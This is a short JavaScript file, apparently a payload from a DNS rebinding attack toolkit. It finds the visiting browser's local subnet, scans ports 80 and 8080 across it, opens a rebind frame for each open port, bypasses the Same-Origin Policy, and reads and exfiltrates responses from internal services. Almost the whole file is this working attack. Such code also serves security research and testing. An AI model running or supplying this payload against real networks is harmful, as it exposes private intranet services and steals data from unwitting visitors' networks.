import NetMap from 'netmap.js'
import * as network from '../libs/network'
import Session from '../libs/session'

const session = new Session()

// mainFrame() runs first
async function mainFrame () {
  const netmap = new NetMap()
  // Use some tricks to derive the browser's local /24 subnet
  const localSubnet = await network.getLocalSubnet(24)

  // Use some more tricks to scan a couple of ports across the subnet
  netmap.tcpScan(localSubnet, [80, 8080]).then(results => {
    // Launch the rebind attack on live targets
    for (let h of results.hosts) {
      for (let p of h.ports) {
        if (p.open) session.createRebindFrame(h.host, p.port)
      }
    }
  })
}

// rebindFrame() will have target ip:port as origin
function rebindFrame () {
  // After this we'll have bypassed the Same-Origin Policy
  session.triggerRebind().then(() => {
    // We can now read the response across origin...
    network.get(session.baseURL, (code, headers, body) => {
      // ... and exfiltrate it
      session.log({code: code, headers: headers, body: body})
    })
  })
}

if (window.args && window.args._rebind) rebindFrame()
else mainFrame()
